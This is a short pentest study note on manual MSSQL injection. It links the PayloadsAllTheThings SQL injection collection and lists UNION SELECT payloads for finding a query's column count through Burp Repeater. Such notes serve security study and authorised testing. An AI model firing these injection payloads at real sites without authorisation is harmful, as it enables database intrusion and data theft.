---
description: 300-348
---

# SQLi

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}

## Manual MSSQL Injection

Do you see a seemingly vulnerable input field that you believe queries the database?

<mark style="color:yellow;">Make a request to it and capture it in burp // send to repeater tab</mark>

```
q=500' union select 1 -- 
q=500' union select 1,2 -- 
q=500' union select 1,2,3 -- 
q=500' union select 1,2,3,4 -- 
q=500' union select 1,2,3,4,5 -- 
q=500' union select 1,2,3,4,5,6,7 -- 
q=500' union select 1,2,3,4,5,6,7,8 -- 
```

* Be sure to check the response tab after you send every request as you do not know when it will return data!

